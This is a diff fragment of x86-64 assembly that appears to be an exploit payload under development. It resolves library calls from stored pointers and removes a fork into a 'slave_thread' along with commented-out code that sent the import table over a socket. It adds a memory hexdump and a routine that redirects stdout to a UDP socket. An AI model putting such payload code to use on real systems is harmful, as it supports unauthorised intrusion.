@@ -199,24 +199,19 @@ first_run:
 
 doprinttext pttextout_got_socket34 "all lib calls resolved\n"
 
-#fork
-    call [rbp - 0x230]
-    test eax, eax
-    jnz checkforkerror
+popstring rdi someflag "%llx: %llx\n"
+mov rsi, qword ptr [r14 + 0x10]
+add rsi, 0x892868
+mov rdx, rsi
 
-    jmp slave_thread
+xor eax, eax
+call [rbp - 0x248]
 
-    checkforkerror:
-    test eax, eax
-    jns fork_ok
+mov rsi, qword ptr [r14 + 0x10]
+add rsi, 0x892868
+mov rdi, rsi
 
-    doprinttext pttextout33 "fork error!\n"
-    jmp result_error
-
-    fork_ok:
-    doprinttext pttextout34 "fork ok!\n"
-
-
+call hexdump
 
 mov eax, 0 #initial second value
 mov rbx, [r14]
@@ -226,32 +221,7 @@ lock cmpxchg dword ptr [rbx], ecx
 printf_the_stuff:
 mov rax, 0
 
-# #send 200 bytes of the resolved imports
-#     lea rsi, [rbp - 0x400]
-#     mov edx, 0x400
 
-#     mov     edi, [r15 - 0x218] # fd
-#     mov     eax, 0
-#     call    [r15 - 0x210] #_write
-
-# #send the import table
-#     mov rsi, [r14 + 8]
-#     mov edx, 10032
-
-#     mov     edi, [r15 - 0x218] # fd
-#     mov     eax, 0
-#     call    [r15 - 0x210] #_write
-
-#close socket
-    # mov     edi, [r15 - 0x218] # fd
-    # mov     eax, 0
-    # call    [r15 - 0x200] #_close
-
-#call testcall
-#call connect_and_send
-
-#mov rax, qword ptr [rbp - 0x178]
-#doprinttext pttextout_got_socket "connection finished\n"
 
 #final stuff
 jmp result_sucess
@@ -444,11 +414,8 @@ _strlen_null:
   pop   rcx            # restore rcx
   ret                  # get out
 
-stage2:
-    ret
 
-
-slave_thread:
+udpoutput: #dont call
 #socket
     mov     edx, 0          # protocol
     mov     esi, 2          # type, TCP = 1 UDP = 2
@@ -480,6 +447,14 @@ slave_thread:
     mov rdi, [r15 - 0x218]
     mov rsi, 1 #STDOUT_FILENO
     call [rbp - 0x240]
+
+    ret
+
+stage2:
+    ret
+
+
+slave_thread:
 
 #set debug var with malloc
 #set stub as next func
